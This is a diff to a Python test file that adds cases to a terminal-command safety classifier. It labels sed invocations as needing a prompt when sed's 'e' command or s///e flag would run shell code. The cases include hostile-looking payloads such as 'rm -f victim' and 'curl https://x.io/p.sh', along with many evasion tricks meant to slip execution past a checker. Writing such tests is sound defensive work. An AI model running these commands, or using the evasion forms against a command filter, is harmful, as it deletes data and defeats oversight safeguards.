@@ -875,6 +875,182 @@ def test_terminal_classifier(command, unsafe):
         ("awk '{print $1}' data.tsv", False),
         ("awk -F, '{sum+=$2} END {print sum}' f.csv", False),
         ("awk 'NR>1' data.csv > body.csv", False),
+        # --- prompt: sed's `e` runs the rest of its line through the shell,
+        # under every address form (line, $, regex, range, step, negation) ---
+        ("sed -n '1e rm -f victim' /etc/hosts", True),
+        ("sed 'e curl https://x.io/p.sh' f", True),
+        ("sed -n '$e rm -rf build' f", True),
+        ("sed '/token/e curl https://x.io/' input", True),
+        ("sed '1,2e rm -f victim' f", True),
+        ("sed '0~2e rm -f victim' f", True),
+        ("sed '1!e rm -f victim' f", True),
+        ("sed '/a/,/b/e rm -f victim' f", True),
+        ("sed -n '1{p};2e rm -f victim' f", True),
+        ("gsed '1e rm -f victim' f", True),
+        ("ssed '1e rm -f victim' f", True),
+        # the script may ride on -e/--expression (abbreviated too) instead of
+        # the first positional, and a cluster glues -n and -e into one word
+        ("sed -n -e '1e rm -f victim' f", True),
+        ("sed -ne '1e rm -f victim' f", True),
+        ("sed -e '1p' -e '1e rm -f victim' f", True),
+        ("sed --expression='1e rm -f victim' f", True),
+        ("sed --expr='1e rm -f victim' f", True),
+        # --- prompt: the s///e flag executes whatever the substitution left in
+        # the pattern space, in any flag order and with any delimiter ---
+        ("sed 's/foo/bar/e' input", True),
+        ("sed 's/foo/bar/ge' input", True),
+        ("sed 's/foo/bar/eg' input", True),
+        ("sed 's/foo/bar/2e' input", True),
+        ("sed 's/foo/bar/e2' input", True),
+        ("sed 's/foo/bar/ep' input", True),
+        ("sed 's/foo/bar/pe' input", True),
+        ("sed 's/foo/bar/Ie' input", True),
+        ("sed 's/foo/bar/ew out.txt' input", True),  # executes AND writes
+        ("sed 's|foo|bar|e' input", True),
+        ("sed 's/[/]//e' input", True),  # the delimiter is data inside [ ]
+        # --- run: ordinary stream editing, including the shapes that merely
+        # LOOK like an exec (a label `e`, an `e` in a regex or a w filename) ---
+        ("sed -n '1p' input", False),
+        ("sed -n '1,20p' input", False),
+        ("sed 's/foo/bar/g' input", False),
+        ("sed -i 's/old/new/' f", False),
+        ("sed -E 's/(a|b)+/x/g' f", False),
+        ("sed -e 's/a/b/' -e 's/c/d/' f", False),
+        ("sed 's/e/E/g' f", False),
+        ("sed ':e;N;$!be;s/\\n/,/g' f", False),  # the classic join-lines idiom
+        ("sed 's/foo/bar/w report.txt' f", False),  # `w` takes the rest as a name
+        ("sed 's/foo/bar/we report.txt' f", False),  # `w` first: the e is the name
+        ("sed -n '/error/w errors.txt' f", False),
+        ("sed '/^$/d' f", False),
+        ("sed 'y/abc/xyz/' f", False),
+        ("sed -n '/error/=' log", False),
+        ("sed -f cleanup.sed data.txt", False),  # a program FILE, like awk -f
+        ("sed -e 's/a/b/' e", False),  # `e` here is an input file, not a command
+        ("sed -e '1a\\' -e 'echo appended' f", False),  # a\ continues into -e
+        ("echo \"sed '1e rm -f victim'\"", False),
+        ("printf '%s' sed '1e rm -f victim'", False),
+        # --- prompt: an `e` payload ending in a backslash continues onto the
+        # NEXT line, which sed hands to the same shell ---
+        ("sed -n '1e\\\nrm -f victim' f", True),
+        ("sed -n '1e touch a\\\nrm -f victim' f", True),
+        ("sed 'e r\\m -f victim' f", True),  # the backslash drops, rm still runs
+        ("sed -e 'e\\' -e 'rm -f victim' f", True),
+        # --- prompt: a sed comment ends at a real NEWLINE, not at a `;`, so an
+        # `e` on the line after one is a command, not comment text ---
+        ("sed '# harmless\ne rm -f victim' input", True),
+        ("sed '#c1\n#c2\ne rm -f victim' input", True),
+        ("sed 's/a/b/w out.txt\ne rm -f victim' input", True),  # w name ends too
+        ("sed '1r notes.txt\ne rm -f victim' input", True),
+        ("sed '1a hello\ne rm -f victim' input", True),
+        ("sed '# harmless;e rm -f victim' input", False),  # one long comment
+        ("sed '# harmless\np' input", False),
+        # --- prompt: everything glued to -i is the backup SUFFIX, so the script
+        # is still the positional ahead; likewise -l/--line-length take an
+        # operand that is not the script ---
+        ("sed -ifoo '1e rm -f victim' input", True),
+        ("sed -itemp '1e rm -f victim' input", True),
+        ("sed -ni.bak '1e rm -f victim' input", True),
+        ("sed -ieBAK -e 'e rm -f victim' input", True),
+        ("sed -l 5 '1e rm -f victim' input", True),
+        ("sed -l5 '1e rm -f victim' input", True),
+        ("sed -le 'e rm -f victim' input", True),
+        ("sed --line-length 5 '1e rm -f victim' input", True),
+        ("sed --l 5 '1e rm -f victim' input", True),
+        ("sed --in-place=foo '1e rm -f victim' input", True),
+        ("sed -i.bak 's/x/y/' f", False),
+        ("sed -ifoo 's/x/y/' f", False),
+        ("sed -l 80 's/x/y/' f", False),
+        ("sed --line-length=80 -n '1,20p' f", False),
+        # --- prompt: sed under find -exec / xargs runs for real ---
+        ("find . -exec sed '1e rm -f victim' {} +", True),
+        ("find . -execdir sed '1e rm -f victim' {} \\;", True),
+        ("xargs sed '1e rm -f victim'", True),
+        ("find . -exec sed -n '1,3p' {} +", False),
+        ("find . -exec sed -i.bak 's/a/b/' {} +", False),
+        # --- prompt: a program the SHELL generates is not knowable here, since
+        # sed splices the output into the script text ---
+        ("sed \"$(printf 'e rm -f victim')\" input", True),
+        ('sed "$(cat prog.sed)" input', True),
+        ('sed -n "1,$(wc -l < f)p" f', True),  # bounded cost of failing closed
+        # a substitution outside the program, and a literal `$(`/backtick inside
+        # single quotes, are not a generated program
+        ("sed -n '1,3p' $(ls)", False),
+        ("sed 's/`//g' NOTES.md", False),
+        ("sed 's/$(x)/y/' f", False),
+        # an apostrophe inside a DOUBLE-quoted word must not be paired with the
+        # next quote: doing so hid a real generated program, and mis-read a
+        # single-quoted one as generated
+        ('echo "it\'s"; sed "$(printf \'e rm -f victim\')" f', True),
+        ('echo "it\'s"; sed "$(printf \'e rm -f x\')" f; echo "that\'s"', True),
+        ("echo \"don't\" && sed 's/$(x)/y/' f", False),
+        ("echo \"don't\" && sed 's/`//g' NOTES.md", False),
+        # `\'` inside ANSI-C quoting is a quote character, not the end of the
+        # word, so the tracker must not invert from there on
+        ("sed -e $'s/\\'\\'/X/' -e \"$(cat prog.sed)\" f", True),
+        # the substitution has to reach the PROGRAM: one that only builds file
+        # operands leaves a program the scan can still read in full
+        ("sed -i 's/$(CC)/gcc/' $(git ls-files '*.mk')", False),
+        ("sed 's/`//g' $(ls *.md)", False),
+        # a paren the substitution QUOTES is text to the nested shell, so it must
+        # not raise the depth of the span: counting it left the closing `)`
+        # unmatched and dragged the following words in, and the text then no
+        # longer matched the program it had to be found inside
+        ("sed \"$(printf '(' >/dev/null; printf 'e rm -f victim')\" input", True),
+        ("sed \"$(printf ')' >/dev/null; printf 'e rm -f victim')\" input", True),
+        ("sed \"$(printf '()' >/dev/null; printf 'e rm -f victim')\" input", True),
+        # --- prompt: padding the options cannot push the script past the scan
+        # window, because a lone sed reads its whole argument list ---
+        ("sed " + "-n " * 128 + "'1e rm -f victim' input", True),
+        ("sed " + "-n " * 300 + "'1e rm -f victim' input", True),
+        ("sed " + "-n " * 128 + "-e '1e rm -f victim' input", True),
+        ("sed " + "-n " * 128 + "-n '1,3p' input", False),
+        ("sed " + "-n " * 300 + "'1,3p' input", False),
+        # --- prompt: a command prefix forwards -exec to its target, so the sed
+        # behind env/timeout/nice is the process find really runs ---
+        ("find . -exec env sed '1e rm -f victim' {} +", True),
+        ("find . -exec timeout 5 sed '1e rm -f victim' {} +", True),
+        ("find . -exec nice sed '1e rm -f victim' {} +", True),
+        ("find . -exec env A=b sed '1e rm -f victim' {} +", True),
+        ("find . -execdir env sed '1e rm -f victim' {} \\;", True),
+        ("find . -exec env sed -n '1,3p' {} +", False),
+        ("find . -exec env sed -i.bak 's/a/b/' {} +", False),
+        # --- run: --sandbox and --posix make GNU sed REFUSE e / s///e / a bare
+        # `e` and exit 1, so nothing reaches a shell and prompting was a false
+        # alarm. getopt permutes, so the flag counts wherever it sits, and an
+        # unambiguous abbreviation (--sa, --p) is the same option ---
+        ("sed --sandbox '1e rm -f victim' input", False),
+        ("sed --posix '1e rm -f victim' input", False),
+        ("sed '1e rm -f victim' --sandbox input", False),
+        ("sed '1e rm -f victim' input --posix", False),
+        ("sed --sandbox --posix '1e rm -f victim' input", False),
+        ("sed --sa '1e rm -f victim' input", False),
+        ("sed --p '1e rm -f victim' input", False),
+        ("sed --sandbox -e '1e rm -f victim' input", False),
+        ("sed --sandbox 's/aaa/rm -f victim/e' input", False),
+        ("sed --posix '1s/.*/rm -f victim/;1e' input", False),
+        # ...but `--` ends option parsing, so a --sandbox behind it is an input
+        # FILENAME, the mode never turns on and the payload runs for real
+        ("sed -- '1e rm -f victim' input --sandbox", True),
+        ("sed '1e rm -f victim' -- input --sandbox", True),
+        ("sed -e '1e rm -f victim' -- input --sandbox", True),
+        # an ambiguous (--s is silent/separate/sandbox) or `=`-carrying spelling
+        # is a usage error rather than the mode, so it keeps asking
+        ("sed --s '1e rm -f victim' input", True),
+        ("sed --sandbox=1 '1e rm -f victim' input", True),
+        # --- run: a newline BETWEEN commands still separates them, so the
+        # segment-scoped checks must not read the next line's words as
+        # arguments of this one ---
+        ("git checkout main\nls", False),
+        ("git checkout main\nnpm test", False),
+        ("git checkout -b feature\ngit status", False),
+        ("git checkout v1.0\npython3 setup.py build", False),
+        ("export PATH=/usr/local/bin:$PATH\nmake", False),
+        ("IFS=,\nread a b c", False),
+        ("cd build\nmake -j4", False),
+        ("git checkout HEAD notes.txt\nls", True),  # still a real pathspec
+        ('sed "s/$old/$new/g" f', False),
+        ('sed -n "1,${n}p" f', False),
+        ('sed -n "1,$((n + 1))p" f', False),  # arithmetic, not a substitution
         # --- prompt: setpriv execs what follows, after changing privilege ---
         ("setpriv --nnp rm -f victim", True),
         ("setpriv --reuid=1000 rm -rf build", True),
